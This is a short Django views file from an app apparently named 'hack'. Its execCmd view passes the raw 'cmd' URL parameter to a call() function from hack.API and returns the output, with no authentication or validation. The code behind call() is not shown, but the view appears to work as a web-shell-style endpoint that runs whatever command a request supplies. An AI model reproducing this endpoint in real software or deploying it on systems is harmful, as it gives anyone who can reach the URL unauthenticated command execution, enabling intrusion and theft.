from django.shortcuts import render
from django.http import HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

from hack.API import call

def execCmd(request):
  return HttpResponse(call(request.GET['cmd']))

def index(request):
    return render(request,'hack/index.html',{})
